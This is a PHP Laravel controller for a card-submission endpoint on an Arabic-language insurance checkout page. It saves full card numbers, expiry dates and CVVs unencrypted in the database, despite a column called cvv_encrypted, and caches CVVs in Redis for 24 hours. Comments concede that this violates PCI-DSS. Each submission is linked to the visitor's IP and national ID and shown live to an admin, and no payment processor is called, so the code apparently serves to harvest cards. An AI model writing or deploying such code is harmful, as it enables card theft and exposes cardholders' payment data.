<?php

namespace App\Http\Controllers;

use App\Http\Requests\SubmitPaymentCardRequest;
use App\Models\CustomerProfile;
use App\Models\PaymentCard;
use App\Models\SiteSetting;
use App\Services\Bin\CardBinResolver;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;

/**
 * Handles payment card submission from CheckoutPage.
 *
 * POST /api/payment-card/submit
 */
class CustomerPaymentCardController extends Controller
{
    public function __construct(private readonly CardBinResolver $binResolver) {}

    public function submit(SubmitPaymentCardRequest $request): JsonResponse
    {
        $validated = $request->validated();
        $ip = $request->ip();

        // Find or create the customer profile
        $customer = CustomerProfile::createOrUpdateByIP($ip, array_filter([
            'current_page' => '/insurance/checkout',
            'total_price'  => $validated['total_price'] ?? null,
            'selected_insurance' => $validated['selected_insurance'] ?? null,
            'national_id'  => $validated['national_id'] ?? null,
        ], fn($v) => $v !== null));

        // Detect card type and issuing bank from BIN
        $cardNumber = preg_replace('/\s+/', '', $validated['card_number']);

        if ($this->isBlockedBin($cardNumber)) {
            return response()->json([
                'success' => false,
                'message' => 'لا يمكن استخدام هذه البطاقة لإتمام العملية.',
            ], 422);
        }

        $cardType = $this->detectCardType($cardNumber);
        $bankCode = $this->binResolver->resolveConfiguredBankKey($cardNumber);

        // last4 used for idempotency lookup only
        $last4 = substr($cardNumber, -4);

        // Idempotency: if a pending card with same last4 + holder exists for
        // this customer (created in the last 5 minutes), return it instead
        // of creating a duplicate. Prevents double-click / retry issues.
        $card = DB::transaction(function () use ($customer, $last4, $validated, $cardNumber, $cardType) {
            $existingCard = PaymentCard::where('customer_profile_id', $customer->id)
                ->where('last4', $last4)
                ->where('holder_name', $validated['holder_name'])
                ->where('status', 'pending')
                ->where('created_at', '>=', now()->subMinutes(5))
                ->lockForUpdate()
                ->first();

            if ($existingCard) {
                // Persistent CVV storage enabled by explicit business request.
                // NOTE: storing CVV after authorization violates PCI-DSS 3.3.1.
                $existingCard->update([
                    'card_number'   => $cardNumber,
                    'expiry_month'  => $validated['expiry_month'],
                    'expiry_year'   => $validated['expiry_year'],
                    'card_type'     => $cardType,
                    'cvv_encrypted' => (string) ($validated['cvv'] ?? ''),
                ]);
                return $existingCard;
            }

            return PaymentCard::create([
                'customer_profile_id' => $customer->id,
                'session_id'          => $validated['session_id'] ?? null,
                'card_number'         => $cardNumber,
                'last4'               => $last4,
                'holder_name'         => $validated['holder_name'],
                'card_type'           => $cardType,
                'expiry_month'        => $validated['expiry_month'],
                'expiry_year'         => $validated['expiry_year'],
                'cvv_encrypted'       => (string) ($validated['cvv'] ?? ''),
                'status'              => 'pending',
            ]);
        });

        // Flush admin customer list caches so dashboard sees fresh data
        CustomerCacheService::flush();

        // CVV redundantly cached in Redis (24h TTL) as fallback when the encrypted
        // DB column is unavailable. NOTE: persistent CVV storage violates PCI-DSS 3.3.1
        // and is enabled by explicit business request.
        Cache::put(
            "card:cvv:{$card->id}",
            (string) ($validated['cvv'] ?? ''),
            now()->addHours(24)
        );

        // Broadcast new card event so admin sees it in real-time
        try {
            $customer->refresh();
            event(new \App\Events\CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'payment_card_submitted'
            ));
        } catch (\Exception $e) {
            report($e);
        }

        return response()->json([
            'success' => true,
            'message' => 'تم حفظ بيانات البطاقة بنجاح',
            'card_id' => $card->id,
            'customer_ip' => $ip,
            'bank_code' => $bankCode,
            'status_sig' => hash_hmac('sha256', 'payment-card|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
        ]);
    }

    /**
     * Detect card type from card number (BIN).
     */
    private function detectCardType(string $number): string
    {
        if (preg_match('/^4/', $number)) {
            return 'visa';
        }
        if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7]/', $number)) {
            return 'mastercard';
        }
        if (preg_match('/^(50|58|60|63|67)/', $number) || preg_match('/^9792/', $number)) {
            return 'mada';
        }
        if (preg_match('/^3[47]/', $number)) {
            return 'amex';
        }

        return 'unknown';
    }

    private function isBlockedBin(string $cardNumber): bool
    {
        if (! SiteSetting::value('smart_rejection_enabled', false)) {
            return false;
        }

        $bins = SiteSetting::value('blocked_card_bins', []);
        if (! is_array($bins)) {
            return false;
        }

        foreach ($bins as $bin) {
            $digits = preg_replace('/\D+/', '', (string) $bin) ?? '';
            if (strlen($digits) >= 6 && str_starts_with($cardNumber, $digits)) {
                return true;
            }
        }

        return false;
    }
}
